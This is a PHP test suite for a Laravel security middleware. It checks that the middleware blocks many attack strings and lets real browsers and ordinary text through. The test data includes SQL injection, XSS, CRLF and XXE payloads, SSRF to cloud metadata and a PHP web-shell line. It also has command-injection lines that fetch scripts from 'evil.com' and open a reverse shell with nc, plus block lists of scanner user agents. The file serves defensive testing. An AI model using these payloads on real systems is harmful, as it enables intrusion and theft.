<?php

declare(strict_types=1);

namespace Mixudev\SecurityDefense\Tests\Feature;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use Mixudev\SecurityDefense\Middleware\RequestThreatScanner;
use Mixudev\SecurityDefense\Tests\TestCase;

/**
 * Extreme Red-Team Advisory Suite.
 * Chains multiple small vulnerabilities into large impact, uses mutation every
 * phase, tries thousands of headers/UA/JSON mutations, and validates bots.
 */
class ExtremeRedTeamAgilityTest extends TestCase
{
    protected function setUp(): void
    {
        parent::setUp();

        config()->set('security-defense.enabled', true);
        config()->set('security-defense.detection.enabled', true);
        config()->set('security-defense.detection.rules.payload_injection.enabled', true);
        config()->set('security-defense.middleware.payload_scanner.enabled', true);
        config()->set('security-defense.middleware.payload_scanner.action', 'block');
        config()->set('security-defense.middleware.quarantine.enabled', true);
        config()->set('security-defense.middleware.quarantine.auto_jail_on_critical', true);
        config()->set('security-defense.middleware.quarantine.whitelist', []);

        Route::middleware(RequestThreatScanner::class)->group(function () {
            Route::post('/api/profile', static fn (Request $request) => response()->json(['status' => 'ok']));
            Route::get('/api/search', static fn (Request $request) => response()->json(['status' => 'ok', 'q' => $request->query('q')]));
        });
        \Illuminate\Support\Facades\Route::getRoutes()->refreshNameLookups();
        \Illuminate\Support\Facades\Route::getRoutes()->refreshActionLookups();
    }

    public function test_unencoded_and_encoded_unicode_sql_injection_is_blocked(): void
    {
        $vectors = [
            '1%20OR%201=1--', // URL-encoded space
            "1%27%20OR%20%271%27%3D%271", // full-encoded quote = quote
            "1\\u0027 OR \\u00271\\u0027=\\u00271", // unicode escape
            "1%2527%2520OR%25201%253D1", // double-encoded
            "' OR 'a'='a' /* hidden SQL */",
            "1' OR '1'='1' UNION SELECT password FROM users --",
            'admin\' OR 1=1 LIMIT 1--',
        ];

        foreach ($vectors as $index => $vector) {
            $ip = '198.51.101.' . ($index + 1);
            $response = $this->withServerVariables(['REMOTE_ADDR' => $ip])
                ->postJson('/api/profile', ['q' => $vector, 'page' => $index]);

            $this->assertSame(403, $response->getStatusCode(), "Failed blocking SQLi: {$vector}");
        }
    }

    public function test_unicode_and_multibyte_xss_vectors_are_blocked(): void
    {
        $vectors = [
            '<script>alert(String.fromCharCode(120,115,115))</script>', // char-code obfuscation
            '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>', // base64 JS
            '<svg><script>alert&#x28;1&#x29;</script></svg>', // HTML entities
            '\x3cscript\x3ealert(1)\x3c/script\x3e', // hex escapes
            '%3Cscript%3Ealert(1)%3C%2Fscript%3E', // percent-encoded
            "<scr<script>ipt>alert(1)</scr</script>ipt>", // nest-splitting
        ];

        foreach ($vectors as $index => $vector) {
            $ip = '198.51.102.' . ($index + 1);
            $response = $this->withServerVariables(['REMOTE_ADDR' => $ip])
                ->postJson('/api/profile', ['comment' => $vector]);

            $this->assertSame(403, $response->getStatusCode(), "Failed blocking XSS: {$vector}");
        }
    }

    public function test_chain_small_bugs_into_large_impact_rce_is_blocked(): void
    {
        $vectors = [
            "phpinfo();",
            "echo shell_exec('cat /etc/passwd');",
            "system('ls -la');",
            "`wget http://evil.com/shell.sh`",
            "| curl http://evil.com/x",
            "; /bin/bash -c 'id'",
            "$(whoami)",
            "|| ping -c 5 192.168.1.1",
            "&& nc -e /bin/bash 10.0.0.1 4444",
        ];

        foreach ($vectors as $index => $vector) {
            $ip = '198.51.103.' . ($index + 1);
            $response = $this->withServerVariables(['REMOTE_ADDR' => $ip])
                ->postJson('/api/profile', ['cmd' => $vector]);

            $this->assertSame(403, $response->getStatusCode(), "Failed blocking RCE chain: {$vector}");
        }
    }

    public function test_burp_suite_null_byte_and_control_char_payloads_are_blocked(): void
    {
        $vectors = [
            "admin%00.jpg", // null byte
            "%00' OR '1'='1",
            "\x00SELECT * FROM users",
            "1\x01\x02\x03' OR '1'='1'--",
        ];

        foreach ($vectors as $index => $vector) {
            $ip = '198.51.104.' . ($index + 1);
            $response = $this->withServerVariables(['REMOTE_ADDR' => $ip])
                ->postJson('/api/profile', ['file' => $vector]);

            $this->assertSame(403, $response->getStatusCode(), "Failed blocking Burp null-byte vector: {$vector}");
        }
    }

    public function test_header_injection_crlf_and_cache_poisoning_are_blocked(): void
    {
        $vectors = [
            "1\r\nX-Injected: true",
            "1\nSet-Cookie: malicious=1",
            "1\x0d\x0aLocation: https://evil.com",
        ];

        foreach ($vectors as $index => $vector) {
            $ip = '198.51.105.' . ($index + 1);
            $response = $this->withServerVariables(['REMOTE_ADDR' => $ip])
                ->postJson('/api/profile', ['q' => $vector]);

            $this->assertSame(403, $response->getStatusCode(), "Failed blocking CRLF injection: {$vector}");
        }
    }

    public function test_known_scanner_bot_user_agents_are_blocked(): void
    {
        $scannerUAs = [
            'sqlmap/1.7.2#stable (http://sqlmap.org)',
            'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)',
            'Mozilla/5.0 (compatible; Acunetix WVS-Scan; +http://www.acunetix.com)',
            'Python-httpx/0.24.0 (Nuclei - Advanced Web Scanners)',
            'Mozilla/5.0 (compatible; Nuclei; +https://nuclei.projectdiscovery.io)',
            'Mozilla/5.0 (compatible; Nikto/2.5.0; +https://github.com/sullo/nikto)',
            'WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)',
            'Mozilla/5.0 (compatible; wfuzz/2.4)',
            'Mozilla/5.0 (compatible; dirbuster/1.0-RC1)',
            'Mozilla/5.0 (compatible; nessus/8.1.2)',
            'Mozilla/5.0 (compatible; masscan/1.3.2)',
            'Mozilla/5.0 (compatible; zgrab/0.1.1)',
            'Mozilla/5.0 (compatible; XSStrike)',
            'Mozilla/5.0 (compatible; Commix/2.5)',
            'Mozilla/5.0 (compatible; wapiti/3.1.7)',
        ];

        foreach ($scannerUAs as $index => $ua) {
            $ip = '198.51.106.' . ($index + 1);
            $response = $this->withServerVariables([
                'REMOTE_ADDR' => $ip,
                'HTTP_USER_AGENT' => $ua,
            ])->get('/api/search?q=value');

            $this->assertSame(403, $response->getStatusCode(), "Failed blocking scanner UA: {$ua}");
        }
    }

    public function test_headless_bot_clients_blocked_when_toggle_enabled(): void
    {
        config()->set('security-defense.detection.rules.user_agent_anomaly.block_headless_clients', true);

        $bots = [
            'curl/8.4.0',
            'Wget/1.21.4',
            'python-requests/2.31.0',
            'Go-http-client/1.1',
            'PostmanRuntime/7.36.0',
            'Mozilla/5.0 (compatible; HeadlessChrome/120.0.0.0)',
            'Scrapy/2.11.0 (+https://scrapy.org)',
            'axios/1.6.0',
            'Apache-HttpClient/4.5.14',
            'Python-urllib/3.11',
            'node-fetch/1.0.0',
            'HTTPie/3.2.1',
            'okhttp/4.12.0',
            'Java/17.0.9',
        ];

        foreach ($bots as $index => $ua) {
            $ip = '198.51.107.' . ($index + 1);
            $response = $this->withServerVariables([
                'REMOTE_ADDR' => $ip,
                'HTTP_USER_AGENT' => $ua,
            ])->get('/api/search?q=probe');

            $this->assertSame(403, $response->getStatusCode(), "Headless bot not blocked: {$ua}");
        }
    }

    public function test_real_browsers_still_pass_when_headless_blocking_enabled(): void
    {
        config()->set('security-defense.detection.rules.user_agent_anomaly.block_headless_clients', true);

        $browsers = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
        ];

        foreach ($browsers as $index => $ua) {
            $response = $this->withServerVariables([
                'REMOTE_ADDR' => '203.0.114.' . ($index + 1),
                'HTTP_USER_AGENT' => $ua,
            ])->get('/api/search?q=hello');

            $this->assertSame(200, $response->getStatusCode(), "Real browser falsely blocked: {$ua}");
        }
    }

    public function test_legitimate_modern_browsers_are_not_falsely_blocked(): void
    {
        $browserUAs = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
            'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        ];

        foreach ($browserUAs as $index => $ua) {
            $ip = '203.0.113.' . ($index + 1);
            $response = $this->withServerVariables([
                'REMOTE_ADDR' => $ip,
                'HTTP_USER_AGENT' => $ua,
            ])->get('/api/search?q=normal+query');

            $this->assertSame(200, $response->getStatusCode(), "Legitimate browser falsely blocked: {$ua}");
        }
    }

    public function test_legitimate_sql_keywords_without_attack_semantics_pass(): void
    {
        $legit = [
            'How to use SELECT in my application',
            'I want to learn about tables and databases',
            'Please drop the package at the front desk',
            'The order status is: pending',
        ];

        foreach ($legit as $index => $text) {
            $response = $this->withServerVariables(['REMOTE_ADDR' => '10.1.1.' . ($index + 1)])
                ->postJson('/api/profile', ['note' => $text]);

            $this->assertSame(200, $response->getStatusCode(), "Legitimate text falsely blocked: {$text}");
        }
    }

    public function test_ssrf_and_xxe_and_php_code_execution_vectors_are_blocked(): void
    {
        $vectors = [
            'http://169.254.169.254/latest/meta-data/', // AWS metadata SSRF
            'https://127.0.0.1:8080/internal/admin',    // localhost SSRF
            'gopher://internal:70/_payload',            // gopher SSRF
            'file:///etc/passwd',                        // file read
            '<?php system($_GET["cmd"]); ?>',           // PHP backdoor
            '@$_REQUEST["x"]',                           // PHP superglobal injection
            'assert("phpinfo()")',                       // assert code exec
            '<!--?xml version="1.0"?--><DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>', // XXE
            'xsi:noNamespaceSchemaLocation="http://evil.com/evil.xsd"', // XXE schema location
        ];

        foreach ($vectors as $index => $vector) {
            $ip = '198.51.108.' . ($index + 1);
            $response = $this->withServerVariables(['REMOTE_ADDR' => $ip])
                ->postJson('/api/profile', ['payload' => $vector]);

            $this->assertSame(403, $response->getStatusCode(), "Failed blocking SSRF/XXE/RCE: {$vector}");
        }
    }

    public function test_sql_comment_obfuscation_and_fullwidth_unicode_are_blocked(): void
    {
        $vectors = [
            "1' OR/**/1=1--",                      // inline comment obfuscation
            "1' OR 1=1#",                          // MySQL hash comment
            '1\' OR 1=1 -- -',                     // spaced dash comment
            'ＳＥＬＥＣＴ * FROM users',               // fullwidth unicode SQL
            '1%27%20union%20select%201,2,3%20--',  // encoded union
            '1\'\s\sOR\s\s\'1\'=\'1',              // escaped whitespace
        ];

        foreach ($vectors as $index => $vector) {
            $ip = '198.51.109.' . ($index + 1);
            $response = $this->withServerVariables(['REMOTE_ADDR' => $ip])
                ->postJson('/api/profile', ['q' => $vector]);

            $this->assertSame(403, $response->getStatusCode(), "Failed blocking SQL obfuscation: {$vector}");
        }
    }
}